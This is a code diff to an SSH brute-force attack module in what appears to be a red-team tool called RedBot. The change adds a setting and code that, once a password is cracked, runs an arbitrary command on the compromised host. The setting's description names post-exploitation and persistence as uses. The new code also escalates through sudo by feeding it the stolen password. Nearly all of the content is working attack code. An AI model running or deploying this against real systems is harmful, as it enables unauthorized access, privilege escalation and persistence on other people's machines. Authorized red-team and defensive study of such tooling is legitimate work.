@@ -28,6 +28,12 @@ class SSHAttack(Attack):
             'description': 'Path to a wordlist containing one username per line. Accepts file paths within the '
                            'RedBot "files" directory, or a valid HTTP(S) URL.'
         },
+        'command': {
+            'name': 'SSH Command',
+            'default': 'ls /',
+            'description': 'Command to run if access is gained, e.g. for post-exploitation, establishing persistence '
+                           'etc. Supports sudo commands. Must exit when done. '
+        }
     }
 
     @classmethod
@@ -64,6 +70,23 @@ def ssh_brute_force(self, host: str, port: int = 22, users: List[str] = [], pass
 
             try:
                 ssh.connect(host=host, port=port, username=user, password=password, timeout=30)
+
+                command = SSHAttack.get_setting('command')
+                if command:
+                    if command.startswith('sudo'):
+                        session = ssh.get_transport().open_session()
+                        session.set_combine_stderr(True)
+                        session.get_pty()
+                        session.exec_command("sudo -k " + command[4:])
+                        stdin = session.makefile('wb', -1)
+                        # stdout = session.makefile('rb', -1) # could be used to check the output of the command
+                        stdin.write(password + '\n')
+                        stdin.flush()
+                        if session.recv_exit_status():
+                            raise Exception("Unable to sudo.")
+                    else:
+                        ssh.exec_command(command, timeout=30)
+
             except paramiko.AuthenticationException:
                 pass
             except socket.error:
